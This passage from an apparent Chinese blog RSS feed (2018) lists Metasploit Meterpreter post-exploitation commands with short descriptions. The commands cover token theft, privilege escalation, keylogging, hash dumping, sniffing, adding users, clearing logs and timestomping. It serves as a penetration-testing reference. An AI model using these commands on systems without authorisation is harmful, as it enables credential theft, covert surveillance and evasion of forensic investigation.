列出受控主机的系统信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;ls
列出目标主机的文件和文件夹信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;use priv
加载特权提升扩展模块，来扩展metasploit库。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;ps
显示所有运行的进程以及相关联的用户账户。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;migrate PID
迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;use incognito
加载incognito功能（用来盗窃目标主机的令牌或假冒用户）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;list_tokens -u
列出目标主机用户的可用令牌。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;list_tokens -g
列出目标主机用户组的可用令牌。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;impersonate_token DOMAIN_NAME\USERNAME
假冒目标主机上的可用令牌。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;steal_token PID
盗窃给定进程的可用令牌并进行令牌假冒。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;drop_token
停止假冒当前令牌。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;getsystem
通过各种攻击向量来提升系统用户权限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;execute -f cmd.exe -i
执行cmd.exe命令并进行交互。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;execute -f cmd.exe -i -t
以所有可用令牌来执行cmd命令并隐藏该进程。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;rev2self
回到控制目标主机的初始用户账户下。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;reg command
在目标主机注册表中进行交互，创建，删除，查询等操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;setdesktop number
切换到另一个用户界面（该功能基于那些用户已登录）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;screenshot
对目标主机的屏幕进行截图。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;upload file
向目标主机上传文件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;download file
从目标主机下载文件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;keyscan_start
针对远程目标主机开启键盘记录功能。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;keyscan_dump
存储目标主机上捕获的键盘记录。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;keyscan_stop
停止针对目标主机的键盘记录。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;getprivs
尽可能多的获取目标主机上的特权。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;uictl enable keyboard/mouse
接管目标主机的键盘和鼠标。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;background
将你当前的metasploit shell转为后台执行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;hashdump
导出目标主机中的口令哈希值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;use sniffer
加载嗅探模式。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sniffer_interfaces
列出目标主机所有开放的网络端口。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sniffer_dump interfaceID pcapname
在目标主机上启动嗅探。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sniffer_start interfaceID packet-buffer
在目标主机上针对特定范围的数据包缓冲区启动嗅探。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sniffer_stats interfaceID
获取正在实施嗅探网络接口的统计数据。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sniffer_stop interfaceID
停止嗅探。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;add_user username password -h ip
在远程目标主机上添加一个用户。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;clearev
清楚目标主机上的日志记录。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;timestomp
修改文件属性，例如修改文件的创建时间（反取证调查）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;reboot
重启目标主机。&lt;/p&gt;
&lt;/blockquote&gt;

</description>
        <pubDate>Fri, 16 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-16/2</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-16/2</guid>
        
        
        <category>Program</category>
        
      </item>
    
  </channel>
</rss>
